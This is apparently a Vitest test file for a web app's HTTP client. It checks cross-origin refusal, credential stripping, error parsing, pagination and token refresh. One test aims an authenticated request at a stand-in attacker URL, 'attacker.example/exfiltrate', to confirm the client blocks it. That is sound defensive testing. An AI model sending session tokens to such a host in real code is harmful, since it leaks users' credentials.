import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  ApiError,
  fetchExternal,
  requestBlob,
  requestJson,
  requestJsonWithHeaders,
  setRefreshCallback,
} from "@/lib/api/http-client";
import { readPaginationHeaders } from "@/lib/api/pagination-headers";
import { saveStoredSession, clearStoredSession } from "@/lib/api/session-storage";
import type { Session } from "@/features/auth/session-types";

const TEST_SESSION: Session = {
  user: {
    id: "00000000-0000-4000-8000-000000000001",
    username: "ops.admin",
    role: "SYSTEM_ADMIN",
    lspId: null,
    mustChangePassword: false,
  },
  accessToken: "session-access-token",
  expiresAt: "2099-01-01T00:00:00.000Z",
};

describe("http-client", () => {
  beforeEach(() => {
    clearStoredSession();
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    setRefreshCallback(null);
    clearStoredSession();
  });

  it("refuses credential-bearing cross-origin absolute URLs before fetch", async () => {
    saveStoredSession(TEST_SESSION);
    const fetchMock = vi.fn();
    vi.stubGlobal("fetch", fetchMock);

    await expect(requestJson("https://attacker.example/exfiltrate")).rejects.toThrow(
      /Refusing cross-origin authenticated request/,
    );
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("allows same-origin absolute URLs", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ ok: true }), {
          status: 200,
          headers: { "Content-Type": "application/json" },
        }),
      ),
    );

    await expect(
      requestJson(
        "http://localhost:8080/api/v1/internal/home/overview",
        {},
        { authenticated: false },
      ),
    ).resolves.toEqual({ ok: true });
  });

  it("fetchExternal strips caller-supplied credentials and idempotency metadata", async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response("ok", { status: 200 }));
    vi.stubGlobal("fetch", fetchMock);
    saveStoredSession(TEST_SESSION);

    await fetchExternal("https://hooks.example.com/ping", {
      method: "GET",
      credentials: "include",
      headers: {
        Authorization: "Bearer caller-secret",
        "Idempotency-Key": "internal-operation-key",
        "X-Public-Header": "safe",
      },
    });

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [, init] = fetchMock.mock.calls[0] as [string, RequestInit];
    expect(init.credentials).toBe("omit");
    const headers = new Headers(init.headers);
    expect(headers.get("Authorization")).toBeNull();
    expect(headers.get("Idempotency-Key")).toBeNull();
    expect(headers.get("X-Public-Header")).toBe("safe");
  });

  it("surfaces Retry-After on 429 responses", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(
          JSON.stringify({
            code: "RATE_LIMIT_EXCEEDED",
            message: "Too many requests. Please retry after 30 seconds.",
          }),
          {
            status: 429,
            headers: {
              "Content-Type": "application/json",
              "Retry-After": "30",
            },
          },
        ),
      ),
    );

    await expect(requestJson("/api/v1/internal/reports/portfolio-mis/summary")).rejects.toSatisfy(
      (error: unknown) => {
        expect(error).toBeInstanceOf(ApiError);
        const apiError = error as ApiError;
        expect(apiError.status).toBe(429);
        expect(apiError.code).toBe("RATE_LIMIT_EXCEEDED");
        expect(apiError.retryAfterSeconds).toBe(30);
        return true;
      },
    );
  });

  it("parses typed 404 NOT_FOUND envelope", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(
          JSON.stringify({
            code: "NOT_FOUND",
            message: "Unknown loan application id: 00000000-0000-0000-0000-000000000099",
            status: 404,
          }),
          { status: 404, headers: { "Content-Type": "application/json" } },
        ),
      ),
    );

    await expect(requestJson("/api/v1/internal/ops/loan-applications/missing")).rejects.toSatisfy(
      (error: unknown) => {
        expect(error).toBeInstanceOf(ApiError);
        const apiError = error as ApiError;
        expect(apiError.status).toBe(404);
        expect(apiError.code).toBe("NOT_FOUND");
        expect(apiError.message).toContain("Unknown loan application");
        return true;
      },
    );
  });

  it("returns JSON body and response headers", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(JSON.stringify([{ id: "loan-1" }]), {
          status: 200,
          headers: {
            "Content-Type": "application/json",
            "X-Total-Count": "42",
            "X-Limit": "25",
            "X-Offset": "50",
          },
        }),
      ),
    );

    const { data, headers } = await requestJsonWithHeaders<[{ id: string }]>(
      "/api/v1/lsp/loan-applications?paginationDetails=ON",
    );

    expect(data).toEqual([{ id: "loan-1" }]);
    expect(readPaginationHeaders(headers)).toEqual({
      totalCount: 42,
      limit: 25,
      offset: 50,
    });
  });

  it("does not dedupe requestJson against requestJsonWithHeaders for the same URL", async () => {
    const fetchMock = vi.fn().mockImplementation(() =>
      Promise.resolve(
        new Response(JSON.stringify([{ id: "loan-1" }]), {
          status: 200,
          headers: {
            "Content-Type": "application/json",
            "X-Total-Count": "1",
          },
        }),
      ),
    );
    vi.stubGlobal("fetch", fetchMock);

    const path = "/api/v1/lsp/loan-applications?paginationDetails=ON";
    const [bodyOnly, withHeaders] = await Promise.all([
      requestJson<[{ id: string }]>(path),
      requestJsonWithHeaders<[{ id: string }]>(path),
    ]);

    expect(fetchMock).toHaveBeenCalledTimes(2);
    expect(bodyOnly).toEqual([{ id: "loan-1" }]);
    expect(withHeaders.data).toEqual([{ id: "loan-1" }]);
    expect(withHeaders.headers.get("X-Total-Count")).toBe("1");
  });

  it("still dedupes concurrent requestJson calls for the same URL", async () => {
    const fetchMock = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({ ok: true }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }),
    );
    vi.stubGlobal("fetch", fetchMock);

    const path = "/api/v1/internal/reports/portfolio-mis/summary";
    const [first, second] = await Promise.all([
      requestJson<{ ok: boolean }>(path),
      requestJson<{ ok: boolean }>(path),
    ]);

    expect(fetchMock).toHaveBeenCalledTimes(1);
    expect(first).toEqual({ ok: true });
    expect(second).toEqual({ ok: true });
  });

  it("refreshes and retries blob downloads after 401", async () => {
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce(new Response("unauthorized", { status: 401 }))
      .mockResolvedValueOnce(
        new Response("pdf-bytes", {
          status: 200,
          headers: {
            "Content-Disposition": 'attachment; filename="statement.pdf"',
          },
        }),
      );
    vi.stubGlobal("fetch", fetchMock);
    setRefreshCallback(async () => "fresh-token");

    const result = await requestBlob("/api/v1/internal/documents/1/download");

    expect(fetchMock).toHaveBeenCalledTimes(2);
    const retryHeaders = fetchMock.mock.calls[1]?.[1]?.headers as Headers;
    expect(retryHeaders.get("Authorization")).toBe("Bearer fresh-token");
    expect(result.filename).toBe("statement.pdf");
    expect(await result.blob.text()).toBe("pdf-bytes");
  });
});
